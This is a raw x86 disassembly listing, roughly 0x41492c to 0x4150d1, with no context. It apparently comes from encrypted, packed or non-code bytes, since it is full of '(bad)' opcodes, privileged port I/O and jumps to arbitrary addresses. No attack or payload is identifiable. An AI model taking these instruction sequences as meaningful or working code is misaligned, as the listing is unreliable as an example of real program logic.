  41492c:	fcmovnu st,st(5)
  41492e:	mov    DWORD PTR [ebp-0x17],edi
  414931:	mov    eax,0x75a5f762
  414936:	ja     0x41495b
  414938:	xor    BYTE PTR [edx+ebx*8-0x2634f28b],dh
  41493f:	pop    eax
  414940:	mov    dh,0x7d
  414942:	out    0xec,eax
  414944:	sbb    DWORD PTR [ecx+eiz*8+0x38],ecx
  414948:	mov    ecx,0xbcd7d9a7
  41494d:	sti    
  41494e:	call   0x89679b79
  414953:	dec    ebp
  414954:	xchg   BYTE PTR [ebx],al
  414956:	retf   0x95aa
  414959:	nop
  41495a:	mov    ds:0x542d71a8,al
  41495f:	sti    
  414960:	push   ebx
  414961:	dec    edx
  414962:	push   0x51
  414964:	pop    eax
  414965:	fisttp QWORD PTR [ebp+0x18]
  414968:	mov    edi,0xeac0acc5
  41496d:	dec    edi
  41496e:	or     dl,dh
  414970:	pop    edi
  414971:	mov    DWORD PTR [edx],ebp
  414973:	dec    ebp
  414974:	xor    al,0x26
  414976:	inc    esp
  414977:	in     al,dx
  414978:	ins    BYTE PTR es:[edi],dx
  414979:	cmp    edx,DWORD PTR [ebp-0x54]
  41497c:	mov    ds:0x2f32df81,eax
  414981:	sbb    cl,BYTE PTR [edi+eiz*1+0x3d74fde7]
  414988:	xchg   esp,eax
  414989:	sub    al,0x60
  41498b:	dec    ebx
  41498c:	gs adc eax,0xc42e9a37
  414992:	shl    DWORD PTR ds:0x45991a95,0x8a
  414999:	cwde   
  41499a:	(bad)  
  41499b:	mov    ecx,0xe919526e
  4149a0:	(bad)  
  4149a1:	out    dx,al
  4149a2:	or     ch,ah
  4149a4:	xchg   esp,eax
  4149a5:	pop    ds
  4149a6:	add    al,0xdc
  4149a8:	xchg   ebx,eax
  4149a9:	mov    ah,0xea
  4149ab:	ficom  WORD PTR [eax+0x2f98a49b]
  4149b1:	cmc    
  4149b2:	xchg   BYTE PTR [eax+0x32a27944],cl
  4149b8:	imul   esp,DWORD PTR [ebp+eiz*2+0x38],0x98bef6e7
  4149c0:	pop    esp
  4149c1:	xor    al,0x63
  4149c3:	jnp    0x4149c0
  4149c5:	jne    0x41496c
  4149c7:	add    al,0xdd
  4149c9:	fidiv  WORD PTR [ecx+0x42]
  4149cc:	in     eax,0x71
  4149ce:	xchg   edx,eax
  4149cf:	shl    DWORD PTR ds:0xb58607a5,0x48
  4149d6:	or     eax,0x58172359
  4149db:	add    esi,ecx
  4149dd:	test   eax,0xa6f04e71
  4149e2:	in     al,0xca
  4149e4:	(bad)  
  4149e5:	pop    ebp
  4149e6:	lds    edi,FWORD PTR [ebx+esi*1]
  4149e9:	dec    ebp
  4149ea:	popa   
  4149eb:	aas    
  4149ec:	inc    eax
  4149ed:	xor    eax,0x59a63507
  4149f2:	iret   
  4149f3:	adc    al,0x93
  4149f5:	xchg   BYTE PTR [ebx],dl
  4149f7:	pop    es
  4149f8:	xchg   ebp,eax
  4149f9:	inc    ecx
  4149fa:	fnstenv [eax-0x149f795b]
  414a00:	jo     0x414a5c
  414a02:	pop    eax
  414a03:	les    edx,FWORD PTR [ebx+0x353a48c6]
  414a09:	sub    eax,0xf83150e2
  414a0e:	repnz adc ah,dh
  414a11:	rcpps  xmm3,XMMWORD PTR [ebx+0x5e154f43]
  414a18:	mov    eax,0x21631e04
  414a1d:	sub    DWORD PTR [ebx-0x64],0x7e
  414a21:	dec    edx
  414a22:	push   0x21
  414a24:	rcr    BYTE PTR [edx],0x58
  414a27:	xchg   ebp,eax
  414a28:	inc    ecx
  414a29:	cld    
  414a2a:	daa    
  414a2b:	(bad)  
  414a2c:	fs ins BYTE PTR es:[edi],dx
  414a2e:	and    cl,BYTE PTR [ebx+edx*8]
  414a31:	push   cs
  414a32:	or     BYTE PTR [edi+0x2eb10b4f],al
  414a38:	jo     0x414a2c
  414a3a:	mov    ds:0x6ef89629,eax
  414a3f:	or     dh,dl
  414a41:	or     eax,0x4383426
  414a46:	inc    esp
  414a47:	out    dx,eax
  414a48:	icebp  
  414a49:	push   ecx
  414a4a:	xchg   edx,eax
  414a4b:	xor    esi,ecx
  414a4d:	(bad)  
  414a4e:	scas   eax,DWORD PTR es:[edi]
  414a4f:	ja     0x4149fd
  414a51:	adc    DWORD PTR [ebx],ebx
  414a53:	or     bl,BYTE PTR [ecx-0x7]
  414a56:	pop    ss
  414a57:	sets   BYTE PTR [ebp+esi*8+0x3058f9cc]
  414a5f:	or     dh,BYTE PTR [ebx-0x66fa7b34]
  414a65:	push   0x35
  414a67:	out    0x34,al
  414a69:	out    dx,eax
  414a6a:	lahf   
  414a6b:	(bad)  
  414a6c:	out    0x33,eax
  414a6e:	pop    ecx
  414a6f:	pop    ebp
  414a70:	enter  0xe3b2,0xb5
  414a74:	adc    BYTE PTR [eax+0x54],al
  414a77:	xchg   edx,eax
  414a78:	push   ecx
  414a79:	push   0xf6b4007d
  414a7e:	imul   edx,DWORD PTR [ebx+eax*2+0x2d290958],0x481ffe68
  414a89:	sahf   
  414a8a:	and    BYTE PTR [edx],bl
  414a8c:	pop    edx
  414a8d:	mov    ds:0x3527067f,al
  414a92:	dec    esi
  414a93:	(bad)  
  414a94:	and    dh,BYTE PTR [edx+edx*1]
  414a97:	icebp  
  414a98:	and    ebx,ebx
  414a9a:	mov    esp,0x9bd148a7
  414a9f:	fs addr16 mov ebx,0xff597328
  414aa6:	rcr    edi,cl
  414aa8:	sub    eax,0xc90617a1
  414aad:	loope  0x414ab7
  414aaf:	or     BYTE PTR [eax-0x506db3d5],dh
  414ab5:	mov    bh,BYTE PTR [edx-0xb]
  414ab8:	sbb    DWORD PTR [ebx-0x2c],ebp
  414abb:	fcmovu st,st(4)
  414abd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414abe:	icebp  
  414abf:	scas   al,BYTE PTR es:[edi]
  414ac0:	and    al,0x2d
  414ac2:	add    dh,BYTE PTR [ecx]
  414ac4:	push   ebx
  414ac5:	jmp    DWORD PTR [ebx]
  414ac7:	(bad)  
  414ac8:	js     0x414a68
  414aca:	sub    al,BYTE PTR [ebp+0x47d25de9]
  414ad0:	xor    BYTE PTR [eax+0x88425d2],dl
  414ad6:	iret   
  414ad7:	mov    edx,0x9d10376
  414adc:	fcmovb st,st(0)
  414ade:	xor    al,0x16
  414ae0:	xchg   esi,eax
  414ae1:	retf   0xcecf
  414ae4:	out    0xe5,eax
  414ae6:	sbb    DWORD PTR [ecx],ebx
  414ae8:	and    al,0xe1
  414aeb:	loop   0x414b06
  414aed:	fadd   DWORD PTR [eax+edx*4+0x2d3d1b69]
  414af4:	pop    edi
  414af5:	push   0x7a
  414af7:	leave  
  414af8:	mov    esp,0xb315c9a6
  414afd:	stos   DWORD PTR es:[edi],eax
  414afe:	inc    ebx
  414aff:	sbb    BYTE PTR [ecx-0x58cdfd30],bh
  414b05:	jns    0x414b0d
  414b07:	jae    0x414b1b
  414b09:	and    eax,0x6e2a2181
  414b0e:	hlt    
  414b0f:	inc    eax
  414b10:	cmp    ch,BYTE PTR [ecx-0x4]
  414b13:	push   ebx
  414b14:	push   0xffffffc5
  414b16:	jo     0x414afa
  414b18:	push   es
  414b19:	sub    al,0xe8
  414b1b:	add    ch,ah
  414b1d:	(bad)  [ebx]
  414b1f:	jp     0x414b92
  414b21:	in     eax,dx
  414b22:	inc    ebp
  414b23:	jp     0x414ab9
  414b25:	mov    ebp,0x150b162e
  414b2a:	adc    BYTE PTR [ebp-0x1f],bl
  414b2d:	shl    DWORD PTR [si-0x2c88],1
  414b32:	(bad)  
  414b33:	jmp    0x9e89316d
  414b38:	and    DWORD PTR [esp+edx*4],ebp
  414b3b:	pop    eax
  414b3c:	fld    QWORD PTR [ebx+0xe]
  414b3f:	pop    es
  414b40:	ins    DWORD PTR es:[edi],dx
  414b41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b42:	sbb    cl,bh
  414b44:	xor    BYTE PTR [eax+0x24b9af60],0xaa
  414b4b:	jl     0x414aee
  414b4d:	ss jne 0x414b75
  414b50:	xor    edi,esi
  414b52:	jnp    0x414b1b
  414b54:	inc    ebx
  414b55:	xchg   esp,eax
  414b56:	rcr    BYTE PTR [ebx+eiz*4-0x616800d1],0xa0
  414b5e:	cmp    al,0xf5
  414b60:	test   eax,0x3275e5a8
  414b65:	sub    DWORD PTR [edx+0x73],ecx
  414b68:	fsub   DWORD PTR [eax]
  414b6a:	loopne 0x414bd1
  414b6c:	mov    ebx,0xf09af0cf
  414b71:	or     DWORD PTR cs:[ebx+0x4061dc9d],ecx
  414b78:	dec    DWORD PTR [ebx-0x3f]
  414b7b:	cld    
  414b7c:	push   ds
  414b7d:	pop    ss
  414b7e:	mov    DWORD PTR [edi],edi
  414b80:	mov    esp,0x3b6bf47e
  414b85:	push   eax
  414b86:	pop    edx
  414b87:	xchg   DWORD PTR ds:0x31e4210c,esp
  414b8d:	add    al,0x9d
  414b8f:	test   esi,0xb39d1a1b
  414b95:	ja     0x414b58
  414b97:	loop   0x414c01
  414b99:	xchg   ebx,esp
  414b9b:	mov    dl,0xab
  414b9d:	outs   dx,DWORD PTR ds:[esi]
  414b9e:	inc    edx
  414b9f:	pop    ebp
  414ba0:	dec    eax
  414ba1:	jo     0x414bbc
  414ba3:	daa    
  414ba4:	mov    dh,ah
  414ba6:	mov    bl,0x61
  414ba8:	(bad)  
  414ba9:	cld    
  414baa:	inc    esi
  414bab:	xor    dl,ch
  414bad:	fnsave [edi]
  414baf:	sub    BYTE PTR [edi],al
  414bb1:	fisub  DWORD PTR [esi+0x641f3ac2]
  414bb7:	and    eax,0x757cf29b
  414bbc:	fdiv   QWORD PTR [edi]
  414bbe:	out    0x9,eax
  414bc0:	cwde   
  414bc1:	push   0x14
  414bc3:	sbb    al,0x52
  414bc5:	pusha  
  414bc6:	sbb    BYTE PTR [esi-0x68249c08],dl
  414bcc:	into   
  414bcd:	sub    edx,DWORD PTR [ebx]
  414bcf:	mov    al,0x24
  414bd1:	leave  
  414bd2:	cmp    al,0x98
  414bd4:	aam    0x31
  414bd6:	jne    0x414c23
  414bd8:	pop    esi
  414bd9:	stos   DWORD PTR es:[edi],eax
  414bda:	cmp    DWORD PTR [edi-0x40668f44],esi
  414be0:	retf   
  414be1:	nop
  414be2:	out    dx,al
  414be3:	dec    edi
  414be4:	outs   dx,BYTE PTR ds:[esi]
  414be5:	cs aaa 
  414be7:	loopne 0x414c5e
  414be9:	retf   0x5f28
  414bec:	jo     0x414c0a
  414bee:	test   BYTE PTR [edx],dh
  414bf0:	sub    DWORD PTR [edi+0x49],esi
  414bf3:	lods   eax,DWORD PTR ds:[esi]
  414bf4:	(bad)  
  414bf5:	repnz leave 
  414bf7:	mov    fs,esi
  414bf9:	adc    BYTE PTR [ebp+0x25ed317c],cl
  414bff:	mov    ds:0xb92c525b,al
  414c04:	mov    ch,0x8a
  414c06:	mov    ah,0xc7
  414c08:	xlat   BYTE PTR ds:[ebx]
  414c09:	je     0x414bb0
  414c0b:	mov    dh,0xa0
  414c0d:	or     ecx,DWORD PTR [esi+0x15780ee8]
  414c13:	fsub   QWORD PTR [esi-0x10]
  414c16:	ds cwde 
  414c18:	jmp    0xebf0be2c
  414c1d:	scas   eax,DWORD PTR es:[edi]
  414c1e:	fst    DWORD PTR [ebp+0x5a]
  414c21:	jo     0x414c3c
  414c23:	lods   al,BYTE PTR ds:[esi]
  414c24:	mov    ecx,0x1280256d
  414c29:	pop    ecx
  414c2a:	pop    edx
  414c2b:	retf   
  414c2c:	push   esp
  414c2d:	out    dx,eax
  414c2e:	dec    ecx
  414c2f:	mov    ds:0xd2a4d149,eax
  414c34:	xchg   esp,eax
  414c35:	hlt    
  414c36:	call   0x3de1c3bf
  414c3b:	mov    WORD PTR [edx],es
  414c3d:	mov    ch,0xb
  414c3f:	push   edx
  414c40:	data16 jae 0x414c2d
  414c43:	add    dh,bh
  414c45:	or     esi,esp
  414c47:	xor    bl,BYTE PTR [edx]
  414c49:	xor    BYTE PTR ss:[eax+0x554f5edf],bl
  414c50:	pop    esi
  414c51:	clc    
  414c52:	(bad)  
  414c53:	iret   
  414c54:	dec    ebx
  414c55:	inc    ebp
  414c56:	mov    eax,0x3fdc5385
  414c5b:	mov    dh,0xfb
  414c5d:	cdq    
  414c5e:	test   eax,0x2b46ea8a
  414c63:	mov    al,ds:0x1a69e38f
  414c68:	inc    esi
  414c69:	bnd je 0x414c52
  414c6c:	mov    edi,ecx
  414c6e:	test   DWORD PTR [ebx],0xd6015212
  414c74:	mov    al,0xc
  414c76:	jo     0x414c21
  414c78:	adc    al,0xfa
  414c7a:	cmp    BYTE PTR [eax+eiz*1-0x78],0xa8
  414c7f:	repnz aad 0xa7
  414c82:	test   eax,0x4d01d2c9
  414c87:	xor    ebx,0x2d
  414c8a:	in     eax,0x6
  414c8c:	aaa    
  414c8d:	hlt    
  414c8e:	xor    bl,al
  414c90:	xlat   BYTE PTR ds:[ebx]
  414c91:	imul   ebp,DWORD PTR [ebx],0x5f
  414c94:	scas   eax,DWORD PTR es:[edi]
  414c95:	cmp    ebx,ebp
  414c97:	adc    eax,0x1fbdb851
  414c9c:	xchg   BYTE PTR [ebp-0x11],cl
  414c9f:	clc    
  414ca0:	cmp    dl,BYTE PTR [ebx-0x3a650430]
  414ca6:	or     cl,dh
  414ca8:	jb     0x414cf1
  414caa:	sub    bh,BYTE PTR [ebx+eax*4]
  414cad:	mov    esi,0x4d376218
  414cb2:	and    eax,ebp
  414cb4:	call   0xebc043e
  414cb9:	iret   
  414cba:	sbb    dl,bl
  414cbc:	mov    eax,ds:0x8ca4d917
  414cc1:	(bad)  
  414cc2:	mov    ah,0xcd
  414cc4:	pop    esi
  414cc5:	les    esp,FWORD PTR [ebx-0x6227355f]
  414ccb:	rcl    edi,1
  414ccd:	push   ebp
  414cce:	inc    esi
  414ccf:	xor    ebx,esp
  414cd1:	cdq    
  414cd2:	mov    eax,ds:0xbc0d7f2f
  414cd7:	lea    eax,[edi-0x57]
  414cda:	js     0x414c7f
  414cdc:	repnz pusha 
  414cde:	adc    DWORD PTR [ebp+0x12],eax
  414ce1:	fstp   DWORD PTR [eax+esi*8]
  414ce4:	stos   DWORD PTR es:[edi],eax
  414ce5:	add    eax,DWORD PTR [eax+0x26c8565f]
  414ceb:	test   BYTE PTR [edi],bl
  414ced:	in     al,dx
  414cee:	pop    edx
  414cef:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  414cf1:	mov    WORD PTR [esi-0x50072cf7],fs
  414cf7:	repz int3 
  414cf9:	in     eax,0xba
  414cfb:	leave  
  414cfc:	fldenv [ebx+edx*8+0xae838f9]
  414d03:	int3   
  414d04:	out    0x7,al
  414d06:	data16 sti 
  414d08:	pop    ss
  414d09:	pop    edx
  414d0a:	ffree  st(0)
  414d0c:	scas   eax,DWORD PTR es:[edi]
  414d0d:	fwait
  414d0e:	mov    ebp,0xd4117c81
  414d13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d14:	xlat   BYTE PTR ds:[ebx]
  414d15:	repnz and edx,DWORD PTR [esi]
  414d18:	mov    dh,0x1
  414d1a:	cdq    
  414d1b:	in     eax,dx
  414d1c:	dec    esi
  414d1d:	push   eax
  414d1e:	fcom   QWORD PTR [esi+ecx*4-0x29]
  414d22:	cmp    eax,0xbd8674cf
  414d27:	test   eax,0x3ee3fbad
  414d2c:	cmp    bl,BYTE PTR [edx-0x67c24939]
  414d32:	shl    cl,1
  414d34:	xchg   ecx,eax
  414d35:	aaa    
  414d36:	es (bad) 
  414d38:	in     eax,0x17
  414d3a:	lea    esp,[edx-0x61]
  414d3d:	outs   dx,BYTE PTR ds:[esi]
  414d3e:	call   0x3987:0x6475b8ad
  414d45:	not    DWORD PTR [edx+0x1c]
  414d48:	adc    al,0x78
  414d4a:	fist   WORD PTR [ecx+0x49]
  414d4d:	shr    bl,cl
  414d4f:	pop    eax
  414d50:	test   DWORD PTR [eax-0x30],edi
  414d53:	scas   eax,DWORD PTR es:[edi]
  414d54:	jge    0x414d7b
  414d56:	mov    ds:0xc30ccb41,eax
  414d5b:	add    esp,edi
  414d5d:	adc    al,0xd
  414d5f:	in     al,dx
  414d60:	jne    0x414d80
  414d62:	stc    
  414d63:	sti    
  414d64:	mov    bl,0xba
  414d66:	out    dx,eax
  414d67:	push   ecx
  414d68:	sub    al,BYTE PTR [ecx-0x6c]
  414d6b:	lock add eax,0x7d7ec02d
  414d71:	xor    DWORD PTR [edx+esi*1-0x3cf148b],edx
  414d78:	rol    esp,1
  414d7a:	repz sbb BYTE PTR [ebp-0x60],dl
  414d7e:	aaa    
  414d7f:	pop    edx
  414d80:	lds    esi,FWORD PTR [edi-0x5e]
  414d83:	stc    
  414d84:	int    0x61
  414d86:	pop    esp
  414d87:	cmp    eax,0x585e61cb
  414d8c:	enter  0x9ec8,0x1e
  414d90:	in     eax,dx
  414d91:	dec    edi
  414d92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d93:	add    DWORD PTR [esi],esi
  414d95:	jb     0x414e0f
  414d97:	xchg   esp,eax
  414d98:	sub    BYTE PTR [ecx],bh
  414d9a:	jns    0x414ddf
  414d9c:	in     eax,0x59
  414d9e:	outs   dx,BYTE PTR ds:[esi]
  414d9f:	xchg   edx,eax
  414da0:	jbe    0x414d9b
  414da2:	(bad)  
  414da3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414da4:	jmp    0xb73:0xaf89c6e6
  414dab:	mov    edi,0x811173b1
  414db0:	lea    esi,[edi-0x635d8a3d]
  414db6:	mov    ds:0x42e19607,al
  414dbb:	sub    cl,BYTE PTR [ebp-0x286db911]
  414dc1:	call   0x492975ce
  414dc6:	popf   
  414dc7:	xor    ebx,0x173299e0
  414dcd:	sub    BYTE PTR [edi],al
  414dcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dd0:	rol    DWORD PTR [ebx],cl
  414dd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414dd3:	xor    edi,esi
  414dd5:	mov    eax,0xeb85debe
  414dda:	or     ebp,DWORD PTR [ebx+esi*2-0x79]
  414dde:	iret   
  414ddf:	leave  
  414de0:	dec    ebp
  414de1:	add    dh,BYTE PTR [edx-0x50c8988e]
  414de7:	jmp    DWORD PTR [edx+ecx*8-0x71]
  414deb:	xor    eax,0xcbf059d9
  414df0:	cs cli 
  414df2:	mov    esi,0x47f3d38c
  414df7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414df8:	popa   
  414df9:	inc    esp
  414dfa:	mov    cl,0xce
  414dfc:	adc    al,0x88
  414dfe:	pop    ecx
  414dff:	mov    dl,0xd
  414e01:	je     0x414e4e
  414e03:	pusha  
  414e04:	and    edx,DWORD PTR [edx-0x8]
  414e07:	xchg   ecx,eax
  414e08:	jl     0x414dce
  414e0a:	jnp    0x414e1d
  414e0c:	pop    ebp
  414e0d:	fcom   st(0)
  414e0f:	(bad)  
  414e10:	cmp    al,0x70
  414e12:	lock not BYTE PTR [edi-0x48afa7ea]
  414e19:	loopne 0x414e36
  414e1b:	mov    cl,0x0
  414e1d:	(bad)  
  414e1e:	mov    edx,0x33d606c
  414e23:	adc    ebx,DWORD PTR [edi]
  414e25:	pop    ss
  414e26:	fwait
  414e27:	xchg   DWORD PTR [edi],ecx
  414e29:	das    
  414e2a:	add    DWORD PTR [esi],esp
  414e2c:	or     DWORD PTR [ebx-0xa],edi
  414e2f:	ror    BYTE PTR [ebx+0x1f5bfba1],1
  414e35:	bound  esp,QWORD PTR [esi+0x7aa4caed]
  414e3b:	inc    eax
  414e3c:	hlt    
  414e3d:	mov    ?,WORD PTR [edi-0x8]
  414e40:	pusha  
  414e41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e42:	outs   dx,BYTE PTR ds:[esi]
  414e43:	or     eax,0x3643ae79
  414e48:	mov    eax,0x48ef9834
  414e4d:	in     eax,0x26
  414e4f:	pop    eax
  414e50:	sub    eax,0xe17bf8da
  414e55:	jecxz  0x414eb6
  414e57:	push   esp
  414e58:	sub    eax,0xb851bef2
  414e5d:	imul   esp,ebp,0x3d2d83b2
  414e63:	pop    ss
  414e64:	fldcw  WORD PTR [esi+ecx*8+0x6b8c9747]
  414e6b:	jbe    0x414e29
  414e6d:	pop    eax
  414e6e:	cmp    eax,DWORD PTR [eax-0x71]
  414e71:	xchg   esi,eax
  414e72:	mov    ds:0xe7e2eb0c,eax
  414e77:	and    dl,al
  414e79:	into   
  414e7a:	(bad)  
  414e7b:	sub    eax,0x73a8fc12
  414e80:	ins    BYTE PTR es:[edi],dx
  414e81:	inc    ebx
  414e82:	mov    esp,0xa632fe28
  414e87:	sahf   
  414e88:	sub    bh,ch
  414e8a:	call   0x7edc:0xc36e8c9e
  414e91:	push   esp
  414e92:	push   edi
  414e93:	mov    dl,0x3f
  414e95:	inc    eax
  414e96:	and    eax,0x301fcb1c
  414e9b:	pop    ss
  414e9c:	inc    eax
  414e9d:	jecxz  0x414ee2
  414e9f:	and    al,0x6
  414ea1:	inc    edi
  414ea2:	test   eax,0x441bf847
  414ea7:	mov    ecx,0x2391c47a
  414eac:	cmp    bl,BYTE PTR [esi]
  414eae:	ja     0x414e7b
  414eb0:	rcr    BYTE PTR [ebp-0x76523cd2],0x9c
  414eb7:	mov    dl,0x2e
  414eb9:	cmp    ch,BYTE PTR [edx-0x19]
  414ebc:	jo     0x414ed2
  414ebe:	add    BYTE PTR [edx+eiz*4],bl
  414ec1:	test   BYTE PTR [ecx+0x75],ah
  414ec4:	or     dh,BYTE PTR [esi]
  414ec6:	xchg   ebx,eax
  414ec7:	gs dec edi
  414ec9:	loop   0x414ebf
  414ecb:	xchg   edx,eax
  414ecc:	(bad)  
  414ece:	icebp  
  414ecf:	ins    BYTE PTR es:[edi],dx
  414ed0:	cmp    esp,DWORD PTR [ebp+0x5ae10942]
  414ed6:	mov    edi,0xcc0132be
  414edb:	bound  edx,QWORD PTR [edx]
  414edd:	push   eax
  414ede:	xchg   edx,eax
  414edf:	nop
  414ee0:	lea    ebp,[ebx+0x5b86617d]
  414ee6:	aam    0x0
  414ee8:	pop    ds
  414ee9:	push   ecx
  414eea:	faddp  st(4),st
  414eec:	dec    esp
  414eed:	shl    BYTE PTR [ecx-0x42a3977d],0x28
  414ef4:	bound  ecx,QWORD PTR [edx]
  414ef6:	and    ch,BYTE PTR [ecx]
  414ef8:	pop    edi
  414ef9:	loope  0x414f37
  414efb:	inc    edi
  414efc:	or     dh,0x18
  414eff:	mov    ch,BYTE PTR [edi]
  414f01:	sar    BYTE PTR [ecx-0xe],0x86
  414f05:	xor    DWORD PTR ds:0x93e0baad,esp
  414f0b:	mov    eax,ds:0xdc90199
  414f10:	call   0xc7fe:0xd821cff8
  414f17:	sti    
  414f18:	mov    al,0x54
  414f1a:	dec    edi
  414f1b:	dec    esi
  414f1c:	cmp    eax,0x7876bf04
  414f21:	add    BYTE PTR [ebx+0xbea08e0],dh
  414f27:	rcr    BYTE PTR [ebp-0x606090dc],0x1c
  414f2e:	inc    ebp
  414f2f:	mov    ah,0x56
  414f31:	xchg   ebp,eax
  414f32:	push   0x17
  414f34:	fstp   TBYTE PTR [ebx+0x14f687c1]
  414f3a:	retf   
  414f3b:	or     esp,DWORD PTR [eax-0x6ebc22ca]
  414f41:	ins    DWORD PTR es:[edi],dx
  414f42:	push   0xfffffffa
  414f44:	iret   
  414f45:	mov    esp,0xb1ceb506
  414f4a:	popa   
  414f4b:	sbb    eax,0xd7f1dd74
  414f50:	xchg   ebx,eax
  414f51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f52:	cdq    
  414f53:	aad    0x10
  414f55:	std    
  414f56:	data16 mov al,0x77
  414f59:	stc    
  414f5a:	sbb    bh,BYTE PTR [ecx]
  414f5c:	retf   0xe9c6
  414f5f:	int3   
  414f60:	push   esp
  414f61:	int    0xde
  414f63:	neg    BYTE PTR [ecx+0x39]
  414f66:	jg     0x414f48
  414f68:	cmp    dh,BYTE PTR [edi]
  414f6a:	mov    ds:0x16f887fa,eax
  414f6f:	das    
  414f70:	in     al,0xda
  414f72:	ror    DWORD PTR [ecx],cl
  414f74:	push   0xffffffdb
  414f76:	push   0xffffffa3
  414f78:	lock cmp BYTE PTR [ebx-0x2238c09d],ah
  414f7f:	push   edx
  414f80:	pop    esi
  414f81:	(bad)  
  414f82:	stc    
  414f83:	xor    BYTE PTR [eax-0x5cd751bf],ch
  414f89:	std    
  414f8a:	fcmovu st,st(0)
  414f8c:	sbb    al,0x94
  414f8e:	scas   al,BYTE PTR es:[edi]
  414f8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f90:	pop    eax
  414f91:	mov    bl,0x69
  414f93:	push   0xfffffff6
  414f95:	jno    0x414f4d
  414f97:	pop    ss
  414f98:	sbb    BYTE PTR [esi-0x57],dl
  414f9b:	inc    eax
  414f9c:	out    0x6d,eax
  414f9e:	sar    BYTE PTR [ecx+0x3b],cl
  414fa1:	xchg   BYTE PTR [esp+edx*8+0x2fab289b],dh
  414fa8:	int3   
  414fa9:	add    bh,BYTE PTR [esp+esi*4+0x49]
  414fad:	and    bl,BYTE PTR [ecx]
  414faf:	imul   edx,ebp,0xaf448730
  414fb5:	dec    ecx
  414fb6:	or     esp,eax
  414fb8:	mov    edx,0xcf3ffb87
  414fbd:	idiv   bh
  414fbf:	push   ds
  414fc0:	pop    ss
  414fc1:	cmp    ah,BYTE PTR [esi+0x11]
  414fc4:	sbb    bl,BYTE PTR [ebx+0x6]
  414fc7:	add    BYTE PTR [ecx+ebx*1],0x25
  414fcb:	leave  
  414fcc:	push   eax
  414fcd:	iret   
  414fce:	imul   edx,DWORD PTR [edi],0x65
  414fd1:	clc    
  414fd2:	sar    BYTE PTR [edx-0x44],0x37
  414fd6:	mov    dl,0x15
  414fd8:	sub    DWORD PTR [ecx],eax
  414fda:	pop    esp
  414fdb:	addr16 aas 
  414fdd:	jmp    0x6a42:0xe1a4b233
  414fe4:	repz cmc 
  414fe6:	int    0x5e
  414fe8:	push   0x5b021a40
  414fed:	push   ebp
  414fee:	cmp    BYTE PTR [eax],ah
  414ff0:	loope  0x41506f
  414ff2:	out    dx,eax
  414ff3:	fidiv  WORD PTR [eax]
  414ff5:	sbb    al,bl
  414ff7:	(bad)  
  414ff8:	and    al,0x24
  414ffa:	(bad)  
  414ffb:	dec    eax
  414ffc:	test   al,0x6f
  414ffe:	jg     0x415046
  415000:	int3   
  415001:	out    0xf8,eax
  415003:	or     BYTE PTR [ebx-0x5987e97e],ah
  415009:	inc    esi
  41500a:	or     al,0x3f
  41500c:	popa   
  41500d:	dec    esp
  41500e:	push   0x2a
  415010:	shl    dl,1
  415012:	mov    esp,0x9255c366
  415017:	sub    BYTE PTR [eax],bl
  415019:	inc    edx
  41501a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41501b:	jae    0x415091
  41501d:	adc    esp,DWORD PTR [ecx+ecx*2]
  415020:	mov    esp,0x9c6d4864
  415025:	fwait
  415026:	jecxz  0x415091
  415028:	pop    eax
  415029:	cwde   
  41502a:	dec    ebx
  41502b:	stc    
  41502c:	push   cs
  41502d:	dec    edx
  41502e:	jbe    0x41507c
  415030:	mov    ah,0xb4
  415032:	xor    edi,ecx
  415034:	pop    eax
  415035:	sbb    ebp,DWORD PTR [eax-0x3c2a3a1f]
  41503b:	jl     0x41501c
  41503d:	jb     0x415024
  41503f:	int    0xb0
  415041:	out    0x88,al
  415043:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415044:	hlt    
  415045:	push   ebp
  415046:	mov    cl,0x10
  415048:	mov    edx,0xc8a85d4
  41504d:	ins    DWORD PTR es:[edi],dx
  41504e:	or     DWORD PTR [eax+ebp*8-0x32],esi
  415052:	cli    
  415053:	pop    ds
  415054:	mov    WORD PTR [ecx-0x2549f657],fs
  41505a:	aad    0xda
  41505c:	pop    ebp
  41505d:	daa    
  41505e:	sub    esp,DWORD PTR [eax+0x6eb56839]
  415064:	jnp    0x41504b
  415066:	add    eax,0x36a24ed2
  41506b:	repnz sub dl,BYTE PTR [di+0x4d]
  415070:	or     esp,DWORD PTR [edi+ebp*1+0x5e65be45]
  415077:	fsub   st,st(7)
  415079:	pop    edi
  41507a:	sar    DWORD PTR [esi*2+0x575a7b75],cl
  415081:	lods   al,BYTE PTR ds:[esi]
  415082:	ja     0x41505e
  415084:	lock les esi,FWORD PTR [ecx+0x4]
  415088:	pusha  
  415089:	retf   
  41508a:	inc    edx
  41508b:	mov    ebx,0x41ad377
  415090:	mov    ?,WORD PTR [esi-0x7b]
  415093:	lock into 
  415095:	xor    BYTE PTR [ecx],cl
  415097:	dec    ebp
  415098:	xchg   ah,ch
  41509a:	sbb    al,0x9f
  41509c:	xor    eax,0xd5827c3b
  4150a1:	aaa    
  4150a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150a3:	pop    es
  4150a4:	inc    ebx
  4150a5:	fild   DWORD PTR [esi-0x6420fb9f]
  4150ab:	fs aaa 
  4150ad:	fwait
  4150ae:	ja     0x415041
  4150b0:	js     0x415105
  4150b2:	inc    ebx
  4150b3:	mov    ds:0x7f3a96fa,eax
  4150b8:	(bad)  
  4150b9:	(bad)  
  4150ba:	dec    ebx
  4150bb:	sbb    bl,ah
  4150bd:	lock cmp al,BYTE PTR [eax+0x2a]
  4150c1:	and    al,dl
  4150c3:	sub    DWORD PTR [ecx+0x436fcc6],0x84726671
  4150cd:	int3   
  4150ce:	dec    esi
  4150cf:	push   0x14
  4150d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
